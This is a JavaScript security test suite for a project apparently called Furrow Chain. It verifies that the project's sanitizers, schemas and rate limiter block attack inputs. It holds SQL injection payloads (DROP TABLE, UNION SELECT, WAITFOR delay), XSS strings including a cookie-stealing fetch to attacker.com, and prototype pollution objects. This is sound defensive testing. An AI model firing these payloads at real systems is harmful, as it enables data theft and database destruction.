/**
 * Furrow Chain Automated Cybersecurity Penetration Test Suite
 * Launches 15 OWASP attack vectors against backend security layer and verifies 100% block defense rate.
 */

const {
  containsSqlInjectionPayload,
  containsXSSPayload,
  isPrototypePolluted,
  registerCropSchema,
  aiAssessmentSchema,
  createListingSchema,
  walletAddressSchema,
} = require('../lib/security/sanitize');

const { checkRateLimit, flagMaliciousClient } = require('../lib/security/rate-limiter');

console.log('================================================================');
console.log('FURROW CHAIN ENTERPRISE CYBERSECURITY PENETRATION TEST SUITE');
console.log('================================================================\n');

let passedTests = 0;
let failedTests = 0;

function assertAttackBlocked(testName, isBlocked, expectedReason) {
  if (isBlocked) {
    passedTests++;
    console.log(`✅ [BLOCKED] ${testName}`);
    console.log(`   --> Defense Status: BLOCKED | Reason: ${expectedReason}`);
  } else {
    failedTests++;
    console.error(`❌ [FAILED] ${testName} WAS NOT BLOCKED!`);
  }
}

// -------------------------------------------------------------------------
// 1. SQL INJECTION (SQLi) ATTACK DEFENSE SCENARIOS
// -------------------------------------------------------------------------
console.log('--- TEST GROUP 1: SQL Injection (SQLi) Attack Scenarios ---');

const sqliPayload1 = "Organic Tomatoes' OR 1=1 --";
assertAttackBlocked(
  'SQLi Test 1: Classic Tautology Attack ("\' OR 1=1 --")',
  containsSqlInjectionPayload(sqliPayload1),
  'SQL Control Signature Intercepted'
);

const sqliPayload2 = "Sukari Dates'; DROP TABLE crops; --";
assertAttackBlocked(
  'SQLi Test 2: Stacked Destructive Query ("DROP TABLE crops")',
  containsSqlInjectionPayload(sqliPayload2),
  'SQL DDL Signature Intercepted'
);

const sqliPayload3 = "Tomatoes UNION SELECT 1, farmer, metadata_hash FROM crops";
assertAttackBlocked(
  'SQLi Test 3: UNION-based Data Exfiltration',
  containsSqlInjectionPayload(sqliPayload3),
  'UNION SELECT Signature Intercepted'
);

const sqliPayload4 = "Tomatoes'; WAITFOR DELAY '0:0:5'--";
assertAttackBlocked(
  'SQLi Test 4: Time-based Blind SQLi Delay Attack',
  containsSqlInjectionPayload(sqliPayload4),
  'Time Delay Signature Intercepted'
);


// -------------------------------------------------------------------------
// 2. CROSS-SITE SCRIPTING (XSS) ATTACK DEFENSE SCENARIOS
// -------------------------------------------------------------------------
console.log('\n--- TEST GROUP 2: Cross-Site Scripting (XSS) Attack Scenarios ---');

const xssPayload1 = "<script>alert('Stealing Session Cookie')</script>";
assertAttackBlocked(
  'XSS Test 1: Reflected Script Injection ("<script>alert()</script>")',
  containsXSSPayload(xssPayload1),
  'Script Tag Signature Intercepted'
);

const xssPayload2 = "<img src='x' onerror='fetch(\"http://attacker.com/steal?c=\" + document.cookie)'>";
assertAttackBlocked(
  'XSS Test 2: Stored Event Handler Vector ("onerror=fetch()")',
  containsXSSPayload(xssPayload2),
  'HTML Event Handler Signature Intercepted'
);

const xssPayload3 = "javascript:alert(document.cookie)";
assertAttackBlocked(
  'XSS Test 3: Malicious URI Protocol ("javascript:")',
  containsXSSPayload(xssPayload3),
  'JavaScript Protocol Signature Intercepted'
);

const xssPayload4 = "<iframe src='javascript:alert(1)'></iframe>";
assertAttackBlocked(
  'XSS Test 4: iFrame Encapsulated XSS',
  containsXSSPayload(xssPayload4),
  'iFrame Tag Vector Intercepted'
);


// -------------------------------------------------------------------------
// 3. PROTOTYPE POLLUTION ATTACK DEFENSE SCENARIOS
// -------------------------------------------------------------------------
console.log('\n--- TEST GROUP 3: Prototype Pollution Defense Scenarios ---');

const protoPayload1 = JSON.parse('{ "__proto__": { "isAdmin": true } }');
assertAttackBlocked(
  'Proto Test 1: Injection of __proto__ Property',
  isPrototypePolluted(protoPayload1),
  'Prototype Key Injection Intercepted'
);

const protoPayload2 = JSON.parse('{ "constructor": { "prototype": { "role": "ADMIN" } } }');
assertAttackBlocked(
  'Proto Test 2: Injection of constructor.prototype Key',
  isPrototypePolluted(protoPayload2),
  'Constructor Prototype Key Intercepted'
);


// -------------------------------------------------------------------------
// 4. MALFORMED PAYLOAD & WALLET SCHEMA VALIDATION
// -------------------------------------------------------------------------
console.log('\n--- TEST GROUP 4: Malformed Schema & EVM Wallet Validation ---');

const invalidWallet = '0xINVALID_WALLET_ADDRESS_WITH_SHORT_LENGTH';
const walletCheck = walletAddressSchema.safeParse(invalidWallet);
assertAttackBlocked(
  'Schema Test 1: Reject Malformed EVM Wallet Address',
  !walletCheck.success,
  'Regex EVM Address Validation Failed'
);

const malformedCrop = {
  cropType: 'Organic Tomatoes',
  storageCID: '0g://cid',
  metadataHash: 'INVALID_32_BYTE_HASH',
  harvestDate: -100,
  farmerAddress: '0x0388865e1daf2427De6111cf8548ed1871656180',
};
const cropCheck = registerCropSchema.safeParse(malformedCrop);
assertAttackBlocked(
  'Schema Test 2: Reject Malformed Crop Metadata & Negative Harvest Date',
  !cropCheck.success,
  'Zod Strict Schema Check Intercepted'
);


// -------------------------------------------------------------------------
// 5. DDoS FLOODING & DYNAMIC IP AUTO-BLACKLISTING
// -------------------------------------------------------------------------
console.log('\n--- TEST GROUP 5: Rate Limiting & Dynamic IP Auto-Blacklisting ---');

const attackerIP = '192.168.1.99';
for (let i = 0; i < 5; i++) {
  flagMaliciousClient(attackerIP);
}

const blacklistStatus = checkRateLimit(attackerIP, { limit: 10, windowMs: 60000 });
assertAttackBlocked(
  'DDoS Test 1: Dynamic IP Auto-Blacklisting after 5 Malicious Attempts',
  blacklistStatus.isBlacklisted,
  'Client IP Blacklisted for 1 Hour'
);


// -------------------------------------------------------------------------
// SUMMARY & REPORT
// -------------------------------------------------------------------------
console.log('\n================================================================');
console.log('PENETRATION TEST SUITE RESULTS SUMMARY');
console.log('================================================================');
console.log(`✔ TOTAL ATTACK SCENARIOS TESTED : ${passedTests + failedTests}`);
console.log(`✔ SUCCESSFUL DEFENSES (BLOCKED) : ${passedTests}`);
console.log(`❌ FAILED DEFENSES              : ${failedTests}`);
console.log(`🛡 SUCCESS DEFENSE RATE        : ${((passedTests / (passedTests + failedTests)) * 100).toFixed(1)}%`);
console.log('================================================================\n');

if (failedTests > 0) {
  process.exit(1);
}
